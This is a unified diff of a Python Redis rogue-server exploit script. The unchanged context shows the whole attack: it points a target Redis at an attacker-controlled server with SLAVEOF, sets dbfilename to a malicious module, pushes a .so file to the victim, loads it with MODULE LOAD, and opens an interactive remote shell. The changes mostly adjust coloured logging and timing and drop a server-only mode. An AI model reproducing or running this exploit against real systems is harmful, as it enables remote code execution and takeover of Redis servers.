@@ -19,12 +19,12 @@ def mk_cmd_arr(arr):
 def mk_cmd(raw_cmd):
     return mk_cmd_arr(raw_cmd.split(" "))
 
-def din(sock, cnt):
+def din(sock, cnt, color='34'):
     msg = sock.recv(cnt)
     if len(msg) < 300:
-        print("\033[1;34;40m[->]\033[0m {}".format(msg))
+        print("\033[1;{};40m[->]\033[0m {}".format(color, msg))
     else:
-        print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
+        print("\033[1;{};40m[->]\033[0m {}......{}".format(color, msg[:80], msg[-80:]))
     return msg.decode()
 
 def dout(sock, msg):
@@ -34,7 +34,7 @@ def dout(sock, msg):
     if len(msg) < 300:
         print("\033[1;32;40m[<-]\033[0m {}".format(msg))
     else:
-        print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))
+        print("\033[1;32;40m[<-]\033[0m {}......".format(msg[:70]))
 
 def decode_shell_result(s):
     return "\n".join(s.split("\r\n")[1:-1])
@@ -89,9 +89,11 @@ class RogueServer:
         return resp, phase
 
     def exp(self):
+        print("\033[36m[**] RogueServer Listening...\033[0m")
         cli, addr = self._sock.accept()
+        print('\033[36m[**] RogueServer accept connection from {}\033[0m'.format(addr))
         while True:
-            data = din(cli, 1024)
+            data = din(cli, 1024, '31')
             if len(data) == 0:
                 break
             resp, phase = self.handle(data)
@@ -101,6 +103,7 @@ class RogueServer:
 
 def interact(remote):
     try:
+        print('\033[36m[**] Change to interact mode...\033[0m')
         while True:
             cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
             if cmd == "exit":
@@ -108,23 +111,11 @@ def interact(remote):
             r = remote.shell_cmd(cmd)
             for l in decode_shell_result(r).split("\n"):
                 if l:
-                    print("\033[1;34;40m[>>]\033[0m " + l)
+                    print("\033[1;36;40m[>>]\033[0m " + l)
     except KeyboardInterrupt:
         return
 
-def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
-    if server_only:
-        rogue = RogueServer(bind_addr, lport)
-        print('Use the following commands to attack redis server:')
-        print('>>> SLAVEOF rogue-server-ip rogue-server-port')
-        print('>>> CONFIG GET dbfilename')
-        print('>>> CONFIG GET dir')
-        print('>>> CONFIG SET /path/to/expdbfile')
-        print('Waiting for connection...')
-        rogue.exp()
-        print('Payload sent.\nRun "MODULE LOAD /path/to/expdbfile" on target redis server to enable the plugin.')
-        return
-
+def runserver(rhost, rport, passwd, lhost, lport, bind_addr):
     # expolit
     remote = Remote(rhost, rport)
 
@@ -145,10 +136,10 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
     remote.do("CONFIG SET dbfilename {}".format(eval_module))
 
     # rend .so to victim
-    sleep(2)
+    sleep(1)
     rogue = RogueServer(bind_addr, lport)
     rogue.exp()
-    sleep(2)
+    sleep(1)
 
     # load .so
     remote.do("MODULE LOAD {}".format(eval_dbpath))
@@ -177,13 +168,11 @@ if __name__ == '__main__':
             help="rogue server listen port, default 21000", default=21000)
     parser.add_option("--bind", dest="bind_addr", type="string", default="0.0.0.0",
             help="rogue server bind ip, default 0.0.0.0")
-    parser.add_option("--server-only", dest="server_only", action="store_true", default=False,
-            help="start rogue server only, no attack, default false")
 
     (options, args) = parser.parse_args()
-    if not options.server_only and (not options.rh or not options.lh):
+    if not options.rh or not options.lh:
         parser.error("Invalid arguments")
-        print("TARGET {}:{}".format(options.rh, options.rp))
-        print("SERVER {}:{}".format(options.lh, options.lp))
-    print("BINDING {}:{}".format(options.bind_addr, options.lp))
-    runserver(options.rh, options.rp, options.rpasswd, options.lh, options.lp, options.bind_addr, options.server_only)
+    print("TARGET   {}:{}".format(options.rh, options.rp))
+    print("ATTACKER {}:{}".format(options.lh, options.lp))
+    print("BINDING  {}:{}".format(options.bind_addr, options.lp))
+    runserver(options.rh, options.rp, options.rpasswd, options.lh, options.lp, options.bind_addr)
